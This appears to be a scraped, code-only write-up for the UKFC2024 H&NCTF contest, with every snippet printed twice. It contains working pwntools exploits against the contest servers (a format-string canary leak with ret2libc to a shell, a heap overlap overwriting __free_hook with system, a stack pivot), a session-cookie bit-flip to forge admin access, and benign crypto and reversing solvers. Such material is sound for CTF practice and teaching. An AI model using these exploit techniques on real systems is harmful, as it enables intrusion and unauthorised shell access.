# UKFC2024 H&NCTF WP

> 原文: https://www.ctfiot.com/181342.html
> ID: 181342

https://github.com/tamuctf/tamuctf-2024/tree/bd8e28c70054ee391b3d4bc2c845481ef0869fba/web/flipped

import requestsfrom base64 import b64decode, b64encode
url = "http://hnctf.imxbt.cn:port/"default_session = '{"admin": 0, "username": "user1"}'res = requests.get(url)c = bytearray(b64decode(res.cookies["session"]))c[default_session.index("0")] ^= 1evil = b64encode(c).decode()#绕黑名单url1 = "http://hnctf.imxbt.cn:port/read?filename=/proc/1/cpuset"res1 = requests.get(url1, cookies={"session": evil})print(res1.text)

>>>import subprocess>>>print(subprocess.getoutput('env'))

from pwn import *import base64
def decrypt(text): aa=text tmp = list (base64.b64decode (aa)) p = 0 aa = [] # 320 for i in range (2,len (tmp)): if tmp [i - 2] == 0x8d and tmp [i - 1] == 0x35: tel = (tmp [i]) | (tmp [i + 1] << 8)
 if tmp [i + 3] == 0xff: p = i + 4 - (0xffff - tel) - 1 else: p = i + 4 + tel
 break

 for i in range (2,len (tmp)): if tmp [i - 2] == 0xc and tmp [i - 1] == 0x34: aa.append (tmp [i]) decrypted_text="" for i in range (p,p + 24):
 if (aa [i - p] ^ tmp [i]) == 0: decrypted_text+="00" # print ("00") continue if (aa [i - p] ^ tmp [i]) <= 0xf: decrypted_text += "0" # print ("0",end = '') decrypted_text+=hex(aa [i - p] ^ tmp [i])[2:] # print ("{:x}".format (aa [i - p] ^ tmp [i]),end = '') return decrypted_text

context.os = 'linux'context.log_level = 'debug'
io = remote('hnctf.imxbt.cn',49306)
def recvString(): io.recvuntil(b'ELF: ') string = (io.recvuntil(b'n'))[:-1].decode() return string
def sendString(string): io.recvuntil(b'Bytes?') io.sendline(string.encode())
def sendExample(): a = recvString() io.recvuntil(b'Expected bytes: ') b = (io.recvuntil(b'n'))[:-1].decode() sendString(b)
sendExample()
##############
for i in range(0,127): aa=recvString() bb=decrypt(aa) sendString(bb)
##############
io.interactive()

Function Initialize(strPwd) Dim box(256) Dim tempSwap Dim a Dim b
 For i = 0 To 255 box(i) = i Next
Function Myfunc(strToHash) Dim tmpFile, strCommand, objFSO, objWshShell, out Set objFSO = CreateObject("Scripting.FileSystemObject") Set objWshShell = CreateObject("WScript.Shell") tmpFile = objFSO.GetSpecialFolder(2).Path & "" & objFSO.GetTempName objFSO.CreateTextFile(tmpFile).Write(strToHash) strCommand = "certutil -hashfile " & tmpFile & " MD5" out = objWshShell.Exec(strCommand).StdOut.ReadAll objFSO.DeleteFile tmpFile Myfunc = Replace(Split(Trim(out), vbCrLf)(1), " ", "")End Function
Function EnCrypt(box, strData) Dim tempSwap Dim a Dim b Dim x Dim y Dim encryptedData encryptedData = "" For x = 1 To Len(strData) a = (a + 1) Mod 256 b = (b + box(a)) Mod 256 tempSwap = box(a) box(a) = box(b) box(b) = tempSwap y = Asc(Mid(strData, x, 1)) Xor box((box(a) + box(b)) Mod 256) encryptedData = encryptedData & LCase(Right("0" & Hex(y), 2)) Next EnCrypt = encryptedDataEnd Function
msgbox "Do you know VBScript?"msgbox "VBScript (""Microsoft Visual Basic Scripting Edition"") is a deprecated Active Scripting language developed by Microsoft that is modeled on Visual Basic."msgbox "It allows Microsoft Windows system administrators to generate powerful tools for managing computers without error handling and with subroutines and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment."msgbox "Interestingly, although VBScript has long since been deprecated, you can still run VBScript scripts on the latest versions of Windows 11 systems."msgbox "A VBScript script must be executed within a host environment, of which there are several provided with Microsoft Windows, including: Windows Script Host (WSH), Internet Explorer (IE), and Internet Information Services (IIS)."msgbox "For .vbs files, the host is Windows Script Host (WSH), aka wscript.exe/cscript.exe program in your system."msgbox "If you can not stop a VBScript from running (e.g. a dead loop), go to the task manager and kill wscript.exe/cscript.exe."msgbox "cscript and wscript are executables for the scripting host that are used to run the scripts. cscript and wscript are both interpreters to run VBScript (and other scripting languages like JScript) on the Windows platform."msgbox "cscript is for console applications and wscript is for Windows applications. It has something to do with STDIN, STDOUT and STDERR."msgbox "OK! Now, let us begin our journey."
key = InputBox("Enter the key:", "CTF Challenge")if (key = False) then wscript.quitif (len(key)<>6) then wscript.echo "wrong key length!" wscript.quitend ifIf (Myfunc(key) = ANtg) Then wscript.echo "You get the key!Move to next challenge."Else wscript.echo "Wrong key!Try again!" wscript.quitEnd If
userInput = InputBox("Enter the flag:", "CTF Challenge")if (userInput = False) then wscript.quitif (len(userInput)<>44) then wscript.echo "wrong!" wscript.quitend ifbox = Initialize(key)encryptedInput = EnCrypt(box, userInput)
If (encryptedInput = eAqi) Then MsgBox "Congratulations! You have learned VBS!"Else MsgBox "Wrong flag. Try again."End If
wscript.echo "bye!"

#include <bits/stdc++.h>int main(){ char aa[]="S_VYFO_CGNN_GRKD_KLYED_IYE"; for (int j=0;j<strlen(aa);j++) { if (aa[j]=='_'){ printf("_"); continue; } for (int i='A';i<='Z';i++) { if (aa[j]==((i + 10 - 65) % 26 + 65)) { printf("%c",i); break; } } } return 0; }

#include <bits/stdc++.h>
int main(){ char aa[]="justaeasyunitygame"; for (int j=0;j<strlen(aa);j++) { printf("%c",(((aa[j] - 'a') + 5) % 26 + 97)); } return 0; }

from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('hnctf.imxbt.cn',38378)else: io=process('/home/kali/Downloads/idea') elf = ELF('/home/kali/Downloads/idea')
#gdb.attach(io)
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
io.recvuntil(b'0x')canary=int(io.recvuntil(b'G')[:-1],16)print("canary==================>",hex(canary))
puts_plt=elf.plt['puts']puts_got=elf.got['puts']
payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(puts_plt)+p32(0x804870D)+p32(puts_got)io.recvuntil(b' data!n')io.sendline(payload)
puts_addr=u32(io.recvuntil(b'xf7')[-4:])print("puts_addr=============>",hex(puts_addr))
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
base_addr=puts_addr-0x05f150system_addr=base_addr+0x03a950binsh_addr=base_addr+0x15912b
payload=payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(system_addr)+p32(0x804870D)+p32(binsh_addr)io.recvuntil(b' data!n')io.sendline(payload)
io.interactive()

from pwn import *p=remote('hnctf.imxbt.cn',port)#p=process("./what")elf=ELF("./what")context.log_level='debug'libc=elf.libcdef cmd(idx): p.sendlineafter(b'Enter your command:',str(idx))
def add(idx): cmd(1) p.sendlineafter(b'size:',str(idx))
def delete(): cmd(2) def show(idx): cmd(3) p.sendlineafter(b'se enter idx:',str(idx))
def edit(idx,cnt): cmd(4) p.sendlineafter(b'er idx:',str(idx)) sleep(3) p.sendlineafter(b'Please enter your content:',cnt)
add(0x68)add(0x420)add(0x68)for i in range(16): add(0xfff)
for i in range(16): delete() 
delete() delete() add(0x420)show(1)p.recvuntil(b'ent:')libc_base=u64(p.recv(6).ljust(8,b'x00'))-libc.symbols['__malloc_hook']-96-0x10print('----->',hex(libc_base))
edit(0,b'a'*0x68+p64(0x431)+b'x00'*0x428+p64(0x71)+p64(libc_base+libc.symbols['__free_hook']-8)) add(0x68)add(0x68)edit(3,b'/bin/shx00'+p64(libc_base+libc.symbols['system']))

p.interactive()

cat flag > &2

from pwn import *
context(os = 'linux',arch ='amd64',log_level = 'debug')
#io = process('./ez_pwn')io = remote('103.8.69.140',42351)#elf = ELF('./ez_pwn')
payload1 = b'a' * (44 - 1) + b'n'io.sendafter(b'name',payload1)
io.recvuntil(payload1)leakstack_addr = u32(io.recv(4))print(hex(leakstack_addr))
puts_plt=0x80483F0
leave_ret = 0x8048637 system_plt = 0x8048400hack_addr = 0x8048566inputstack_addr = leakstack_addr - 0x3cpayload2 = (b'shx00x00'+ p32(system_plt) + p32(inputstack_addr) + p32(inputstack_addr + 0x8)).ljust(44,b'a') + p32(inputstack_addr + 0x4)
io.send(payload2)
io.interactive()

from z3 import *n= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637153017419446619484868441764669690727579779099567694199763164730314171397195403162134843973164325220857213018410963127358399705331729543773388617561557740781phin= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637131484098271088612965442194315038048171911247107215251247008707944522314305941884323954755887627723714550317505603859341783252342756873595331720023643277564add = n-phin+1x = Real('x')y = Real('y')s = Solver()s.add(x*y==n,x+y==add)print(s.check())print(s.model())

谢太傅寒雪日内集，与儿女讲论文义。俄而雪骤，公欣然曰：“白雪纷纷何所似？”兄子胡儿曰：“撒盐空中差可拟。”兄女曰：“未若柳絮因风起。”公大笑乐。即公大兄无奕女，左将军王凝之妻也。

https://330k.github.io/misc_tools/unicode_steganography.html

def to8bArr(baguaStr): code = {'乾': '0', # '兑': '1', # '离': '2', # '震': '3', # '巽': '4', # '坎': '5', # '艮': '6', # '坤': '7', # }
 bArr = []
 temp = [] # 把八卦符转为8进制数字 for s in baguaStr: temp.append(code[s]) print(temp) tempStr = '' # 数字3个一组 组合回八进制 for i in range(len(temp)): tempStr += temp[i] if i % 3 == 2: bArr.append('0o' + tempStr) tempStr = '' for i in bArr: print(chr(int(i, base=8)),end='')to8bArr('兑震乾兑乾坤乾艮乾兑兑艮兑乾震兑乾坎兑艮乾兑乾艮乾艮巽兑离震兑坎坤兑乾艮兑坎离兑兑巽兑艮离兑震兑兑坎震兑离离兑兑离兑坤乾兑艮离兑兑坎兑兑震兑艮巽兑坎坤兑兑巽兑艮兑兑艮乾兑离艮兑兑坤兑坎艮兑乾离兑离巽兑兑坎兑兑离兑艮坤兑艮乾兑离乾兑巽兑兑坤乾兑艮离兑兑巽兑艮兑兑艮乾兑离艮兑离乾兑巽离兑坎坤乾坎震')


```
import requestsfrom base64 import b64decode, b64encode
url = "http://hnctf.imxbt.cn:port/"default_session = '{"admin": 0, "username": "user1"}'res = requests.get(url)c = bytearray(b64decode(res.cookies["session"]))c[default_session.index("0")] ^= 1evil = b64encode(c).decode()#绕黑名单url1 = "http://hnctf.imxbt.cn:port/read?filename=/proc/1/cpuset"res1 = requests.get(url1, cookies={"session": evil})print(res1.text)
```



```
>>>import subprocess>>>print(subprocess.getoutput('env'))
```



```
from pwn import *import base64
def decrypt(text): aa=text tmp = list (base64.b64decode (aa)) p = 0 aa = [] # 320 for i in range (2,len (tmp)): if tmp [i - 2] == 0x8d and tmp [i - 1] == 0x35: tel = (tmp [i]) | (tmp [i + 1] << 8)
 if tmp [i + 3] == 0xff: p = i + 4 - (0xffff - tel) - 1 else: p = i + 4 + tel
 break

 for i in range (2,len (tmp)): if tmp [i - 2] == 0xc and tmp [i - 1] == 0x34: aa.append (tmp [i]) decrypted_text="" for i in range (p,p + 24):
 if (aa [i - p] ^ tmp [i]) == 0: decrypted_text+="00" # print ("00") continue if (aa [i - p] ^ tmp [i]) <= 0xf: decrypted_text += "0" # print ("0",end = '') decrypted_text+=hex(aa [i - p] ^ tmp [i])[2:] # print ("{:x}".format (aa [i - p] ^ tmp [i]),end = '') return decrypted_text

context.os = 'linux'context.log_level = 'debug'
io = remote('hnctf.imxbt.cn',49306)
def recvString(): io.recvuntil(b'ELF: ') string = (io.recvuntil(b'n'))[:-1].decode() return string
def sendString(string): io.recvuntil(b'Bytes?') io.sendline(string.encode())
def sendExample(): a = recvString() io.recvuntil(b'Expected bytes: ') b = (io.recvuntil(b'n'))[:-1].decode() sendString(b)
sendExample()
##############
for i in range(0,127): aa=recvString() bb=decrypt(aa) sendString(bb)
##############
io.interactive()
```



```
Function Initialize(strPwd) Dim box(256) Dim tempSwap Dim a Dim b
 For i = 0 To 255 box(i) = i Next
Function Myfunc(strToHash) Dim tmpFile, strCommand, objFSO, objWshShell, out Set objFSO = CreateObject("Scripting.FileSystemObject") Set objWshShell = CreateObject("WScript.Shell") tmpFile = objFSO.GetSpecialFolder(2).Path & "" & objFSO.GetTempName objFSO.CreateTextFile(tmpFile).Write(strToHash) strCommand = "certutil -hashfile " & tmpFile & " MD5" out = objWshShell.Exec(strCommand).StdOut.ReadAll objFSO.DeleteFile tmpFile Myfunc = Replace(Split(Trim(out), vbCrLf)(1), " ", "")End Function
Function EnCrypt(box, strData) Dim tempSwap Dim a Dim b Dim x Dim y Dim encryptedData encryptedData = "" For x = 1 To Len(strData) a = (a + 1) Mod 256 b = (b + box(a)) Mod 256 tempSwap = box(a) box(a) = box(b) box(b) = tempSwap y = Asc(Mid(strData, x, 1)) Xor box((box(a) + box(b)) Mod 256) encryptedData = encryptedData & LCase(Right("0" & Hex(y), 2)) Next EnCrypt = encryptedDataEnd Function
msgbox "Do you know VBScript?"msgbox "VBScript (""Microsoft Visual Basic Scripting Edition"") is a deprecated Active Scripting language developed by Microsoft that is modeled on Visual Basic."msgbox "It allows Microsoft Windows system administrators to generate powerful tools for managing computers without error handling and with subroutines and other advanced programming constructs. It can give the user complete control over many aspects of their computing environment."msgbox "Interestingly, although VBScript has long since been deprecated, you can still run VBScript scripts on the latest versions of Windows 11 systems."msgbox "A VBScript script must be executed within a host environment, of which there are several provided with Microsoft Windows, including: Windows Script Host (WSH), Internet Explorer (IE), and Internet Information Services (IIS)."msgbox "For .vbs files, the host is Windows Script Host (WSH), aka wscript.exe/cscript.exe program in your system."msgbox "If you can not stop a VBScript from running (e.g. a dead loop), go to the task manager and kill wscript.exe/cscript.exe."msgbox "cscript and wscript are executables for the scripting host that are used to run the scripts. cscript and wscript are both interpreters to run VBScript (and other scripting languages like JScript) on the Windows platform."msgbox "cscript is for console applications and wscript is for Windows applications. It has something to do with STDIN, STDOUT and STDERR."msgbox "OK! Now, let us begin our journey."
key = InputBox("Enter the key:", "CTF Challenge")if (key = False) then wscript.quitif (len(key)<>6) then wscript.echo "wrong key length!" wscript.quitend ifIf (Myfunc(key) = ANtg) Then wscript.echo "You get the key!Move to next challenge."Else wscript.echo "Wrong key!Try again!" wscript.quitEnd If
userInput = InputBox("Enter the flag:", "CTF Challenge")if (userInput = False) then wscript.quitif (len(userInput)<>44) then wscript.echo "wrong!" wscript.quitend ifbox = Initialize(key)encryptedInput = EnCrypt(box, userInput)
If (encryptedInput = eAqi) Then MsgBox "Congratulations! You have learned VBS!"Else MsgBox "Wrong flag. Try again."End If
wscript.echo "bye!"
```



```
#include <bits/stdc++.h>int main(){ char aa[]="S_VYFO_CGNN_GRKD_KLYED_IYE"; for (int j=0;j<strlen(aa);j++) { if (aa[j]=='_'){ printf("_"); continue; } for (int i='A';i<='Z';i++) { if (aa[j]==((i + 10 - 65) % 26 + 65)) { printf("%c",i); break; } } } return 0; }
```



```
#include <bits/stdc++.h>
int main(){ char aa[]="justaeasyunitygame"; for (int j=0;j<strlen(aa);j++) { printf("%c",(((aa[j] - 'a') + 5) % 26 + 97)); } return 0; }
```



```
from pwn import *from LibcSearcher import *context(os='linux',arch='i386',log_level='debug')
ifremote=1if ifremote==1: io=remote('hnctf.imxbt.cn',38378)else: io=process('/home/kali/Downloads/idea') elf = ELF('/home/kali/Downloads/idea')
#gdb.attach(io)
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
io.recvuntil(b'0x')canary=int(io.recvuntil(b'G')[:-1],16)print("canary==================>",hex(canary))
puts_plt=elf.plt['puts']puts_got=elf.got['puts']
payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(puts_plt)+p32(0x804870D)+p32(puts_got)io.recvuntil(b' data!n')io.sendline(payload)
puts_addr=u32(io.recvuntil(b'xf7')[-4:])print("puts_addr=============>",hex(puts_addr))
payload=b'%7$p'io.recvuntil(b'How many bytes do you want me to read? ')io.sendline(b'-32')io.recvuntil(b"Ok, sounds good. I'll give u a gift!n")io.sendline(payload)
base_addr=puts_addr-0x05f150system_addr=base_addr+0x03a950binsh_addr=base_addr+0x15912b
payload=payload=b'a'*0x20+p32(canary)+b'aaaa'*3+p32(system_addr)+p32(0x804870D)+p32(binsh_addr)io.recvuntil(b' data!n')io.sendline(payload)
io.interactive()
```



```
from pwn import *p=remote('hnctf.imxbt.cn',port)#p=process("./what")elf=ELF("./what")context.log_level='debug'libc=elf.libcdef cmd(idx): p.sendlineafter(b'Enter your command:',str(idx))
def add(idx): cmd(1) p.sendlineafter(b'size:',str(idx))
def delete(): cmd(2) def show(idx): cmd(3) p.sendlineafter(b'se enter idx:',str(idx))
def edit(idx,cnt): cmd(4) p.sendlineafter(b'er idx:',str(idx)) sleep(3) p.sendlineafter(b'Please enter your content:',cnt)
add(0x68)add(0x420)add(0x68)for i in range(16): add(0xfff)
for i in range(16): delete() 
delete() delete() add(0x420)show(1)p.recvuntil(b'ent:')libc_base=u64(p.recv(6).ljust(8,b'x00'))-libc.symbols['__malloc_hook']-96-0x10print('----->',hex(libc_base))
edit(0,b'a'*0x68+p64(0x431)+b'x00'*0x428+p64(0x71)+p64(libc_base+libc.symbols['__free_hook']-8)) add(0x68)add(0x68)edit(3,b'/bin/shx00'+p64(libc_base+libc.symbols['system']))

p.interactive()
```



```
cat flag > &2
```



```
from pwn import *
context(os = 'linux',arch ='amd64',log_level = 'debug')
#io = process('./ez_pwn')io = remote('103.8.69.140',42351)#elf = ELF('./ez_pwn')
payload1 = b'a' * (44 - 1) + b'n'io.sendafter(b'name',payload1)
io.recvuntil(payload1)leakstack_addr = u32(io.recv(4))print(hex(leakstack_addr))
puts_plt=0x80483F0
leave_ret = 0x8048637 system_plt = 0x8048400hack_addr = 0x8048566inputstack_addr = leakstack_addr - 0x3cpayload2 = (b'shx00x00'+ p32(system_plt) + p32(inputstack_addr) + p32(inputstack_addr + 0x8)).ljust(44,b'a') + p32(inputstack_addr + 0x4)
io.send(payload2)
io.interactive()
```



```
from z3 import *n= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637153017419446619484868441764669690727579779099567694199763164730314171397195403162134843973164325220857213018410963127358399705331729543773388617561557740781phin= 111062058535162164984738836722967570966613906169432119952622928416997120106420704969085000793236763239688932646444218230300216706798108324937797855830637131484098271088612965442194315038048171911247107215251247008707944522314305941884323954755887627723714550317505603859341783252342756873595331720023643277564add = n-phin+1x = Real('x')y = Real('y')s = Solver()s.add(x*y==n,x+y==add)print(s.check())print(s.model())
```



```
谢太傅寒雪日内集，与儿女讲论文义。俄而雪骤，公欣然曰：“白雪纷纷何所似？”兄子胡儿曰：“撒盐空中差可拟。”兄女曰：“未若柳絮因风起。”公大笑乐。即公大兄无奕女，左将军王凝之妻也。
```



```
def to8bArr(baguaStr): code = {'乾': '0', # '兑': '1', # '离': '2', # '震': '3', # '巽': '4', # '坎': '5', # '艮': '6', # '坤': '7', # }
 bArr = []
 temp = [] # 把八卦符转为8进制数字 for s in baguaStr: temp.append(code[s]) print(temp) tempStr = '' # 数字3个一组 组合回八进制 for i in range(len(temp)): tempStr += temp[i] if i % 3 == 2: bArr.append('0o' + tempStr) tempStr = '' for i in bArr: print(chr(int(i, base=8)),end='')to8bArr('兑震乾兑乾坤乾艮乾兑兑艮兑乾震兑乾坎兑艮乾兑乾艮乾艮巽兑离震兑坎坤兑乾艮兑坎离兑兑巽兑艮离兑震兑兑坎震兑离离兑兑离兑坤乾兑艮离兑兑坎兑兑震兑艮巽兑坎坤兑兑巽兑艮兑兑艮乾兑离艮兑兑坤兑坎艮兑乾离兑离巽兑兑坎兑兑离兑艮坤兑艮乾兑离乾兑巽兑兑坤乾兑艮离兑兑巽兑艮兑兑艮乾兑离艮兑离乾兑巽离兑坎坤乾坎震')
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715698192.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1715698194.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1715698195.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/0-1715698196.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1715698198.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1715698200.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1715698202.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1715698204.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1715698205.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1715698206.png)